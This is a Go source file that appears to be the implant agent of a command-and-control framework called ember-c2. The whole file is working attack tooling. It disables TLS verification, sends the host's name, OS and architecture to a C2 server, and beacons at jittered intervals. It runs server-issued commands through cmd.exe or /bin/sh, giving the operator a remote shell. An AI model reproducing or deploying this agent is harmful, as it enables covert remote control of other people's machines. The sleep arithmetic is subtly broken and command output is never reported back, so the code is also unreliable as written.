package main

import (
	"bytes"
	cryptorand "crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/ash-tise/ember-c2/internal/proto"
)

var c2URL string = "https://localhost:8443"
var client *http.Client
var agentID string
var hostname string
var agentOS string
var agentArch string
var generator *rand.Rand
var sleepMinSec = 30
var sleepMaxSec = 100

func initClient() {
	// set up config for client creation
	config := &tls.Config{InsecureSkipVerify: true}
	transport := &http.Transport{TLSClientConfig: config}
	client = &http.Client{Transport: transport}
}

func register() error {
	// get Agent Hostname, OS, and Arch
	host, err := os.Hostname()
	if err != nil {
		return fmt.Errorf("Unable to fetch Hostname: %v", err)
	}
	hostname = host
	agentOS = runtime.GOOS
	agentArch = runtime.GOARCH

	// place data into Beacon struct
	beacon := proto.Beacon{
		Hostname: hostname,
		OS:       agentOS,
		Arch:     agentArch,
	}

	// prepare and send beacon data to C2
	data, err := json.Marshal(&beacon)
	if err != nil {
		return fmt.Errorf("Error encoding beacon data: %v", err)
	}
	body := bytes.NewReader(data)
	request, err := http.NewRequest("POST", c2URL, body)
	if err != nil {
		return fmt.Errorf("Error building POST request: %v", err)
	}
	request.Header.Set("Content-Type", "application/json")

	// get HTTP response from server
	response, err := client.Do(request)
	if err != nil {
		return fmt.Errorf("Error getting HTTP response: %v", err)
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		responseBody, err := io.ReadAll(response.Body)
		if err != nil {
			return fmt.Errorf("Error reading server response body: %v", err)
		}
		return fmt.Errorf("Registration failed. HTTP Status Code %d: %s", response.StatusCode, string(responseBody))
	}

	// retrieve and set agentID
	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		return fmt.Errorf("Error parsing agentID from server: %v", err)
	}
	agentID = string(responseBody)

	return nil
}

func initRand() {
	// randomly generate int64 for seed
	buff := make([]byte, 8)
	if _, err := cryptorand.Read(buff); err != nil {
		log.Fatalf("Error generating random seed: %v", err)
	}
	seed := binary.LittleEndian.Uint64(buff)
	generator = rand.New(rand.NewSource(int64(seed)))
}

func beacon() error {
	// create initial Beacon
	agentBeacon := proto.Beacon{
		AgentID:  agentID,
		Hostname: hostname,
		OS:       agentOS,
		Arch:     agentArch,
		Result:   "",
	}

	// send initial Beacon to server
	data, err := json.Marshal(&agentBeacon)
	if err != nil {
		return fmt.Errorf("Error encoding beacon data: %v", err)
	}
	body := bytes.NewReader(data)
	request, err := http.NewRequest("POST", c2URL+"/beacon", body)
	request.Header.Set("Content-Type", "application/json")

	// grab server response
	response, err := client.Do(request)
	if err != nil {
		return fmt.Errorf("Error sending beacon data: %v", err)
	}
	defer response.Body.Close()

	responsePayload := proto.Response{}

	// agent action depending on HTTP response
	switch response.StatusCode {
	case http.StatusOK:
		// retrieve commands into responsePayload
		responseBody, err := io.ReadAll(response.Body)
		if err != nil {
			return fmt.Errorf("Error reading server response body: %v", err)
		}
		if err = json.Unmarshal(responseBody, &responsePayload); err != nil {
			return fmt.Errorf("Error parsing commands into Response struct: %v", err)
		}
		if len(responsePayload.Commands) == 0 {
			return nil
		}

		// execute commands
		for _, command := range responsePayload.Commands {
			log.Printf("TASK RECEIVED: ID %s, Action: %s, Args: %s", command.TaskID, command.Action, command.Arguments)
			executeCommand(command)
		}
		return nil
	case http.StatusNoContent:
		return nil
	default:
		responseBody, err := io.ReadAll(response.Body)
		if err != nil {
			return fmt.Errorf("Error reading server response body: %v", err)
		}
		return fmt.Errorf("Could not connect to server. HTTP status code %d: %s", response.StatusCode, responseBody)
	}
}

func executeCommand(cmd proto.Command) string {
	switch cmd.Action {
	case "kill":
		os.Exit(0)
		return "killing agent..." // return statement to satisfy compiler
	case "sleep":
		var sleepMin int = 0
		var sleepMax int = 0

		_, err := fmt.Sscanf(cmd.Arguments, "%d %d", &sleepMin, &sleepMax)
		if err != nil {
			log.Printf("Failed to update agent sleep interval: %v", err)
			return fmt.Sprintf("Failed to update agent sleep interval: %v", err)
		}
		sleepMinSec = sleepMin
		sleepMaxSec = sleepMax
		return fmt.Sprintf("Sleep interval updated to %d-%d seconds", sleepMin, sleepMax)
	case "shell":
		var output []byte
		var err error
		if agentOS == "windows" {
			output, err = exec.Command("cmd.exe", "/C", cmd.Arguments).CombinedOutput()
		} else {
			output, err = exec.Command("/bin/sh", "-c", cmd.Arguments).CombinedOutput()
		}

		result := string(output)
		if err != nil {
			if len(result) > 0 {
				result += "\n"
			}
			result += fmt.Sprintf("[ERROR] Execution failed: %v", err)
		}
		return result
	default:
		return fmt.Sprintf("Unknown command: %s", cmd.Action)
	}
}

func main() {
	// initialization functions
	initRand()
	initClient()
	if err := register(); err != nil {
		log.Fatalf("Failed to register agent: %v", err)
	}

	for {
		// sleep random amount of time
		timeToSleep := generator.Intn(sleepMaxSec-sleepMinSec) + 30
		time.Sleep(time.Duration(timeToSleep) * time.Second)

		// beacon callout
		if err := beacon(); err != nil {
			log.Printf("Could not connect to server: %v", err)
			continue
		}

		// post processing things here
	}
}
